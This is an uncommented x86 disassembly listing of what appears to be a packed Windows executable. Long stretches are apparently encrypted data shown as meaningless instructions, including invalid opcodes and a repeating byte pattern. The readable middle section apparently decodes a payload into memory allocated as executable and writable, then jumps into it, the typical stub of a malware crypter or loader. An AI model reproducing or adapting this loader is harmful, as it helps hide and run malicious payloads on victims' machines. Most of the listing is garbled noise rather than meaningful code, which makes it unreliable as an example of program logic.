  42132b:	imul   ecx,DWORD PTR [edx+0x4fb22a86],0xc8224f77
  421335:	loopne 0x42136c
  421337:	ja     0x42139f
  421339:	int    0x6a
  42133b:	test   BYTE PTR [ebx],0x9d
  42133e:	out    dx,al
  42133f:	leave  
  421340:	cmp    al,al
  421342:	mov    edi,0xb8502cb1
  421347:	imul   ebx,DWORD PTR [ebp+eax*8+0xe],0xffffff86
  42134c:	push   ecx
  42134d:	leave  
  42134e:	and    al,cl
  421350:	stc    
  421351:	icebp  
  421352:	xchg   esp,eax
  421353:	cdq    
  421354:	sbb    eax,0x5b6b9676
  421359:	pop    ds
  42135a:	cmp    al,0x39
  42135c:	and    ah,BYTE PTR [edx+0x46fb2c54]
  421362:	mov    gs,WORD PTR [edi-0x22]
  421365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421366:	xchg   BYTE PTR [eax+0x7c64e5ea],bl
  42136c:	rcr    DWORD PTR [eax-0x4f],1
  42136f:	mov    ds:0xe2a73f35,al
  421374:	mov    al,0x32
  421376:	dec    ebx
  421377:	push   ds
  421378:	and    edi,0xffffffee
  42137b:	sub    dh,al
  42137d:	loopne 0x42139d
  42137f:	add    al,0xf5
  421381:	push   0x2
  421383:	jecxz  0x4213b4
  421385:	dec    ebx
  421386:	xchg   DWORD PTR ds:0x829a8e1d,ebx
  42138c:	pop    edx
  42138d:	repnz test eax,0xb95d9724
  421393:	scas   al,BYTE PTR es:[edi]
  421394:	or     esp,DWORD PTR [edi-0x46]
  421397:	call   0x45aa2ca5
  42139c:	iret   
  42139d:	iret   
  42139e:	push   cs
  42139f:	or     al,0x26
  4213a1:	or     BYTE PTR [edx-0x46022cd3],dl
  4213a7:	cmp    al,0x4e
  4213a9:	or     eax,0x55e0317c
  4213ae:	mov    bh,0xc6
  4213b0:	push   edi
  4213b1:	sub    ecx,DWORD PTR [eax-0x5b]
  4213b4:	add    BYTE PTR [edi-0x10d1bbcf],cl
  4213ba:	dec    ebp
  4213bb:	sub    bl,BYTE PTR [edi-0x64966e6d]
  4213c1:	shl    cl,0x3b
  4213c4:	test   eax,0x45db8543
  4213c9:	fsub   QWORD PTR [edx-0x1d]
  4213cc:	jecxz  0x421372
  4213ce:	add    al,0xee
  4213d0:	ror    BYTE PTR [ebp-0x5092ebfb],0x28
  4213d7:	jmp    0x20f62597
  4213dc:	(bad)  
  4213dd:	ficom  WORD PTR [edx]
  4213df:	pop    esi
  4213e0:	sti    
  4213e1:	jae    0x421447
  4213e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213e4:	retf   0xb3d7
  4213e7:	dec    ebp
  4213e8:	adc    al,0x3c
  4213ea:	fnstenv [ebp-0x2ce7ff4]
  4213f0:	pop    ebp
  4213f1:	sub    BYTE PTR [edi-0x44],0x61
  4213f5:	xchg   ecx,eax
  4213f6:	mov    DWORD PTR [ecx+edx*4-0x50],edi
  4213fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213fb:	xchg   ebx,eax
  4213fc:	outs   dx,DWORD PTR ds:[esi]
  4213fd:	mov    edi,es
  4213ff:	dec    edx
  421400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421401:	addr16 aam 0x1
  421404:	pop    ecx
  421405:	popf   
  421406:	or     esp,DWORD PTR [ecx+0x4d28cb9b]
  42140c:	pop    ebx
  42140d:	(bad)  
  42140e:	in     eax,dx
  42140f:	jb     0x42146d
  421411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421412:	sub    esp,DWORD PTR [esi]
  421414:	jecxz  0x4213e4
  421416:	cli    
  421417:	xchg   edx,eax
  421418:	mov    al,ds:0x860ee103
  42141d:	push   esp
  42141e:	out    dx,al
  42141f:	inc    esp
  421420:	and    BYTE PTR [edx-0x71],ah
  421423:	xchg   BYTE PTR [eax+edx*4-0x29],ch
  421427:	push   esp
  421428:	imul   eax
  42142a:	mov    edi,0x361a4d24
  42142f:	pop    ss
  421430:	js     0x4213f8
  421432:	in     al,0x9b
  421434:	je     0x421470
  421436:	and    DWORD PTR [edi-0x1c],esp
  421439:	retf   
  42143a:	adc    eax,0x5e51c8b7
  42143f:	sbb    eax,0x1aa35068
  421444:	test   al,0x1f
  421446:	ffreep st(4)
  421448:	add    eax,0xcf6c8057
  42144d:	(bad)  
  42144e:	sub    eax,0xccc2994f
  421453:	mov    edx,0x99768fc5
  421458:	or     ebp,0xffffffe4
  42145b:	inc    edi
  42145c:	pushf  
  42145d:	pop    ebp
  42145e:	sub    edx,DWORD PTR ds:0xd602fc6d
  421464:	in     al,0x1e
  421466:	mov    edi,0x1f845c7d
  42146b:	adc    DWORD PTR [eax],ebp
  42146d:	pop    esp
  42146e:	ret    0x356a
  421471:	jnp    0x42143e
  421473:	mov    ch,dh
  421475:	xor    BYTE PTR [edi+0x5e],ah
  421478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421479:	jne    0x4214e4
  42147b:	out    dx,al
  42147c:	imul   ebx,DWORD PTR [edx+0x65a9c05],0x2f
  421483:	(bad)  
  421485:	(bad)  
  421486:	cwde   
  421487:	sub    al,0x49
  421489:	cmp    ebp,esi
  42148b:	lods   al,BYTE PTR ds:[esi]
  42148c:	out    dx,al
  42148d:	data16 aad 0x4a
  421490:	(bad)  
  421491:	popf   
  421492:	push   0x6b6d7e4
  421497:	enter  0xe5b3,0xcf
  42149b:	stos   DWORD PTR es:[edi],eax
  42149c:	ja     0x4214ef
  42149e:	dec    edi
  42149f:	enter  0x9e4b,0x7b
  4214a3:	sahf   
  4214a4:	push   esi
  4214a5:	mov    al,0xd9
  4214a7:	push   ecx
  4214a8:	imul   edi,DWORD PTR [ecx+0x1e94159c],0x98fb88fa
  4214b2:	push   esi
  4214b3:	mov    ah,0x2a
  4214b5:	sub    DWORD PTR [esi],edi
  4214b7:	out    dx,al
  4214b8:	pop    esp
  4214b9:	jmp    0x4214c8
  4214bb:	pop    esp
  4214bc:	fadd   QWORD PTR [ebx+0x51]
  4214bf:	or     si,WORD PTR [ebp+0x3d]
  4214c3:	xor    esp,DWORD PTR [edi+ebp*1-0x3]
  4214c7:	aam    0xdf
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x6bab2d3a
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x9454d473
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	call   DWORD PTR [ecx+ebp*1]
  421830:	add    bh,BYTE PTR [eax]
  421832:	popa   
  421833:	cdq    
  421834:	sbb    al,0x5a
  421836:	sbb    al,0x15
  421838:	in     al,0x65
  42183a:	push   edi
  42183b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42183c:	jae    0x4217d0
  42183e:	and    BYTE PTR [edx-0x67],0x1c
  421842:	pop    edx
  421843:	sbb    BYTE PTR ds:0x59a825e4,dl
  421849:	jae    0x4217dd
  42184b:	cmp    BYTE PTR [edx-0x67],ah
  42184e:	sbb    al,0x5a
  421850:	sbb    BYTE PTR ds:0x59a865e4,dl
  421856:	jae    0x4217ea
  421858:	cmp    BYTE PTR [edx-0x67],ah
  42185b:	sbb    al,0x5a
  42185d:	sbb    BYTE PTR ds:0x59a865e4,dl
  421863:	jae    0x4217f7
  421865:	cmp    BYTE PTR [edx-0x67],ah
  421868:	sbb    al,0x5a
  42186a:	loopne 0x421881
  42186c:	in     al,0x65
  42186e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42186f:	inc    esi
  421870:	leave  
  421871:	pushf  
  421872:	cmp    dh,dl
  421874:	nop
  421875:	sar    DWORD PTR [ebx-0x60],1
  421878:	adc    al,0xa8
  42187a:	test   al,0x89
  42187c:	or     eax,0x424bfb1b
  421881:	jmp    0x67c14df4
  421886:	test   DWORD PTR [eax],ecx
  421888:	mov    BYTE PTR [edx],bh
  42188a:	adc    bh,ah
  42188c:	push   esi
  42188d:	or     eax,0x7d383ced
  421892:	xor    eax,0x79c61096
  421897:	sbb    bh,ah
  421899:	sbb    BYTE PTR [esi],ah
  42189b:	(bad)  
  42189c:	dec    edi
  42189d:	jp     0x421914
  42189f:	jp     0x421821
  4218a1:	add    BYTE PTR [esi+0x1c987e54],al
  4218a7:	bound  ebx,QWORD PTR [ecx+0x15185a1c]
  4218ad:	in     al,0x62
  4218af:	xor    DWORD PTR [ebp-0xf3f2ed6],esp
  4218b5:	xchg   ebx,eax
  4218b6:	pop    edi
  4218b7:	mov    ds:0x9da71f8a,al
  4218bc:	cmp    dl,BYTE PTR [ebx+0x2b]
  4218bf:	div    DWORD PTR [eax+ebp*2]
  4218c2:	(bad)  
  4218c3:	in     al,0xc8
  4218c5:	adc    cl,BYTE PTR [ebp-0x7f]
  4218c8:	pop    ebp
  4218c9:	mov    ds:0x32008b9b,al
  4218ce:	cmp    bh,ah
  4218d0:	and    eax,0x76ed7050
  4218d5:	outs   dx,DWORD PTR ds:[esi]
  4218d6:	test   bh,dl
  4218d8:	dec    edx
  4218d9:	cwde   
  4218da:	jle    0x421876
  4218dc:	or     edx,DWORD PTR [esi]
  4218de:	adc    BYTE PTR [eax+0x502fee04],bl
  4218e4:	retf   
  4218e5:	jns    0x4218bf
  4218e7:	mov    eax,0xa2449363
  4218ec:	mov    bl,BYTE PTR [edi]
  4218ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ef:	popf   
  4218f0:	cmp    edx,DWORD PTR [ebx+0x5b]
  4218f3:	imul   ebp,DWORD PTR [edx-0x253bd998],0x12
  4218fa:	pop    eax
  4218fb:	sbb    al,0xf7
  4218fd:	mov    ds:0x32af1601,al
  421902:	push   0x61
  421904:	mov    ss,WORD PTR [eax+0x40]
  421907:	jo     0x4218f5
  421909:	outs   dx,DWORD PTR ds:[esi]
  42190a:	jmp    0x9607:0x6098e1a1
  421911:	push   ss
  421912:	sbb    al,ah
  421914:	xchg   esi,ebp
  421916:	aaa    
  421917:	sar    DWORD PTR [edx],0x1b
  42191a:	rol    eax,1
  42191c:	lock xchg ebx,eax
  42191e:	sbb    al,0x5a
  421920:	sbb    BYTE PTR ds:0x59a865e4,dl
  421926:	and    edx,edi
  421928:	cmp    BYTE PTR [edx-0x2b],ah
  42192b:	sbb    eax,0x34b51858
  421930:	push   cs
  421931:	out    0x59,eax
  421933:	jae    0x4218c7
  421935:	cmp    BYTE PTR [edx-0x67],ah
  421938:	sbb    al,0x5a
  42193a:	clc    
  42193b:	adc    eax,0x58a364e7
  421940:	jns    0x4218d4
  421942:	cmp    BYTE PTR [ebp+ebx*4+0x13a45a1c],cl
  421949:	in     al,0x65
  42194b:	test   al,0x59
  42194d:	jae    0x4218d2
  42194f:	test   DWORD PTR [edx-0x67],esp
  421952:	sbb    al,0x4a
  421954:	sbb    BYTE PTR ds:0x59ad65e4,dl
  42195a:	jae    0x4218ee
  42195c:	jns    0x4219c0
  42195e:	cdq    
  42195f:	or     al,0x5a
  421961:	sbb    BYTE PTR ds:0x5ca865e6,dl
  421967:	jae    0x4218fc
  421969:	cmp    BYTE PTR [edx-0x67],ah
  42196c:	sbb    al,0x5a
  42196e:	sbb    eax,0xa865e515
  421973:	pop    ecx
  421974:	jae    0x421908
  421976:	cmp    BYTE PTR [edx],dh
  421978:	xchg   ebp,eax
  421979:	sbb    al,0x5a
  42197b:	sbb    al,0x15
  42197d:	in     al,0x64
  42197f:	dec    esp
  421980:	pop    esp
  421981:	jae    0x421913
  421983:	cmp    BYTE PTR [edx+0x19],ah
  421986:	sbb    al,0x5a
  421988:	or     BYTE PTR ds:0x59a875e4,dl
  42198e:	jae    0x421922
  421990:	sub    BYTE PTR [edx-0x67],ah
  421993:	or     al,0x5a
  421995:	sbb    BYTE PTR ds:0x49a865e4,dl
  42199b:	jae    0x42192f
  42199d:	cmp    BYTE PTR [edx-0x67],ah
  4219a0:	sbb    al,0x5a
  4219a2:	sbb    BYTE PTR ds:0x605c65e4,dl
  4219a8:	jg     0x42193c
  4219aa:	push   ecx
  4219ab:	popa   
  4219ac:	cdq    
  4219ad:	sbb    al,0x5a
  4219af:	call   0xe16cfdd2
  4219b4:	pop    ecx
  4219b5:	jae    0x421949
  4219b7:	cmp    BYTE PTR [edx-0x67],ah
  4219ba:	sbb    al,0x5a
  4219bc:	sbb    BYTE PTR ds:0x59a865e4,dl
  4219c2:	jae    0x421956
  4219c4:	cmp    BYTE PTR [edx-0x67],ah
  4219c7:	sbb    al,0x5a
  4219c9:	sbb    BYTE PTR ds:0x59a865e4,dl
  4219cf:	jae    0x421963
  4219d1:	cmp    BYTE PTR [edx-0x67],ah
  4219d4:	sbb    al,0x5a
  4219d6:	sbb    BYTE PTR ds:0x59a865e4,dl
  4219dc:	jae    0x421970
  4219de:	cmp    BYTE PTR [edx-0x67],ah
  4219e1:	sbb    al,0x5a
  4219e3:	sbb    BYTE PTR ds:0x59a865e4,dl
  4219e9:	jae    0x42197d
  4219eb:	cmp    BYTE PTR [edx-0x67],ah
  4219ee:	sbb    al,0x5a
  4219f0:	sbb    BYTE PTR ds:0x59a865e4,dl
  4219f6:	jae    0x42198a
  4219f8:	cmp    BYTE PTR [edx-0x67],ah
  4219fb:	sbb    al,0x5a
  4219fd:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a03:	jae    0x421997
  421a05:	cmp    BYTE PTR [edx-0x67],ah
  421a08:	sbb    al,0x5a
  421a0a:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a10:	jae    0x4219a4
  421a12:	cmp    BYTE PTR [edx-0x67],ah
  421a15:	sbb    al,0x5a
  421a17:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a1d:	jae    0x4219db
  421a1f:	dec    esp
  421a20:	pop    es
  421a21:	loope  0x421a8b
  421a23:	pop    edx
  421a24:	sbb    BYTE PTR ds:0x59a385e4,dl
  421a2a:	jae    0x4219ae
  421a2c:	cmp    BYTE PTR [edx-0x67],ah
  421a2f:	enter  0x185e,0x15
  421a33:	loopne 0x421a9a
  421a35:	test   al,0x9
  421a37:	ror    DWORD PTR ss:[edx],1
  421a3a:	ss (bad) 
  421a3c:	sbb    al,0x5a
  421a3e:	sbb    BYTE PTR ds:0x598865e4,dl
  421a44:	jae    0x421ab8
  421a46:	push   ss
  421a47:	adc    dl,ch
  421a49:	outs   dx,BYTE PTR ds:[esi]
  421a4a:	cmp    DWORD PTR [eax],ebx
  421a4c:	adc    eax,0x59c865e4
  421a51:	jae    0x4219e5
  421a53:	enter  0x9969,0x1c
  421a57:	add    BYTE PTR [eax],bl
  421a59:	adc    eax,0x59acbde4
  421a5e:	jae    0x4219f2
  421a60:	cmp    BYTE PTR [edx-0x67],ah
  421a63:	sbb    al,0x5a
  421a65:	sbb    BYTE PTR ds:0x79a865e4,dl
  421a6b:	jae    0x4219ff
  421a6d:	fsub   DWORD PTR [edx-0x67]
  421a70:	sbb    al,0x5a
  421a72:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a78:	jae    0x421a0c
  421a7a:	cmp    BYTE PTR [edx-0x67],ah
  421a7d:	sbb    al,0x5a
  421a7f:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a85:	jae    0x421a19
  421a87:	cmp    BYTE PTR [edx-0x67],ah
  421a8a:	sbb    al,0x5a
  421a8c:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a92:	jae    0x421a26
  421a94:	cmp    BYTE PTR [edx-0x67],ah
  421a97:	sbb    al,0x5a
  421a99:	sbb    BYTE PTR ds:0x59a865e4,dl
  421a9f:	jae    0x421a33
  421aa1:	cmp    BYTE PTR [edx-0x67],ah
  421aa4:	sbb    al,0x5a
  421aa6:	sbb    BYTE PTR ds:0x59a865e4,dl
  421aac:	jae    0x421a40
  421aae:	cmp    BYTE PTR [edx-0x67],ah
  421ab1:	sbb    al,0x5a
  421ab3:	sbb    BYTE PTR ds:0x59a865e4,dl
  421ab9:	jae    0x421a4d
  421abb:	cmp    BYTE PTR [edx-0x67],ah
  421abe:	sbb    al,0x5a
  421ac0:	sbb    BYTE PTR ds:0x59a865e4,dl
  421ac6:	jae    0x421a5a
  421ac8:	cmp    BYTE PTR [edx-0x67],ah
  421acb:	sbb    al,0x5a
  421acd:	sbb    BYTE PTR ds:0x59a865e4,dl
  421ad3:	jae    0x421a67
  421ad5:	cmp    BYTE PTR [edx-0x67],ah
  421ad8:	sbb    al,0x5a
  421ada:	sbb    BYTE PTR ds:0x59a865e4,dl
  421ae0:	jae    0x421a74
  421ae2:	cmp    BYTE PTR [edx-0x67],ah
  421ae5:	sbb    al,0x5a
  421ae7:	sbb    BYTE PTR ds:0x59a865e4,dl
  421aed:	jae    0x421a81
  421aef:	cmp    BYTE PTR [edx-0x67],ah
  421af2:	sbb    al,0x5a
  421af4:	sbb    BYTE PTR ds:0x59a865e4,dl
  421afa:	jae    0x421a8e
  421afc:	cmp    BYTE PTR [edx-0x67],ah
  421aff:	sbb    al,0x5a
  421b01:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b07:	jae    0x421a9b
  421b09:	cmp    BYTE PTR [edx-0x67],ah
  421b0c:	sbb    al,0x5a
  421b0e:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b14:	jae    0x421aa8
  421b16:	cmp    BYTE PTR [edx-0x67],ah
  421b19:	sbb    al,0x5a
  421b1b:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b21:	jae    0x421ab5
  421b23:	cmp    BYTE PTR [edx-0x67],ah
  421b26:	sbb    al,0x5a
  421b28:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b2e:	jae    0x421ac2
  421b30:	cmp    BYTE PTR [edx-0x67],ah
  421b33:	sbb    al,0x5a
  421b35:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b3b:	jae    0x421acf
  421b3d:	cmp    BYTE PTR [edx-0x67],ah
  421b40:	sbb    al,0x5a
  421b42:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b48:	jae    0x421adc
  421b4a:	cmp    BYTE PTR [edx-0x67],ah
  421b4d:	sbb    al,0x5a
  421b4f:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b55:	jae    0x421ae9
  421b57:	cmp    BYTE PTR [edx-0x67],ah
  421b5a:	sbb    al,0x5a
  421b5c:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b62:	jae    0x421af6
  421b64:	cmp    BYTE PTR [edx-0x67],ah
  421b67:	sbb    al,0x5a
  421b69:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b6f:	jae    0x421b03
  421b71:	cmp    BYTE PTR [edx-0x67],ah
  421b74:	sbb    al,0x5a
  421b76:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b7c:	jae    0x421b10
  421b7e:	cmp    BYTE PTR [edx-0x67],ah
  421b81:	sbb    al,0x5a
  421b83:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b89:	jae    0x421b1d
  421b8b:	cmp    BYTE PTR [edx-0x67],ah
  421b8e:	sbb    al,0x5a
  421b90:	sbb    BYTE PTR ds:0x59a865e4,dl
  421b96:	jae    0x421b2a
